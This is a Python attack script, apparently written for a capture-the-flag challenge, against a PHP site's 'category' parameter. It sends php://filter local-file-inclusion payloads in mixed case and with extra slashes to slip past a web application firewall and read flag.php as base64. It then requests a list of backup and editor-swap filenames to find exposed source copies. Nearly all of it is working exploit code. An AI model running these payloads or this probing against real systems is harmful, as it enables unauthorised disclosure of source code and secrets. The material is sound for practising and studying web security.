"""Round 8: case-sensitivity WAF bypass + Apache backup/source files."""
import re
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="
ROOT = "http://noctf.fa1lsnow.com:40547/"

CATS = [
    "PHP://filter/convert.base64-encode/resource=woofers/../flag",
    "PhP://filter/convert.base64-encode/resource=woofers/../flag",
    "PHP://filter/convert.base64-encode/resource=flag",
    "php:////filter/convert.base64-encode/resource=woofers/../flag",
]

PATHS = [
    "flag.php~", "flag.php.bak", "flag.php.old", "flag.php.save",
    "flag.php.swp", ".flag.php.swp", "flag.phps", "flag.php.txt",
    "flag.php.orig", "flag.php.dist", "flag.txt~",
]


def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


print("=== CASE / SLASH VARIANTS ===")
for c in CATS:
    url = BASE + c
    st, body = fetch(url)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:500]
        if "Sorry" in body:
            note += " [SORRY]"
        if "Warning" in body:
            wm = re.search(r"include\([^)]{0,200}", body)
            note += " [WARN: " + (wm.group(0) if wm else "?") + "]"
    print(f"[{st}] {c!r}\n      {note}\n")

print("=== APACHE BACKUPS ===")
for p in PATHS:
    st, body = fetch(ROOT + p)
    snippet = re.sub(r"\s+", " ", body)[:150] if isinstance(body, str) else ""
    print(f"[{st}] /{p} -> {snippet}")
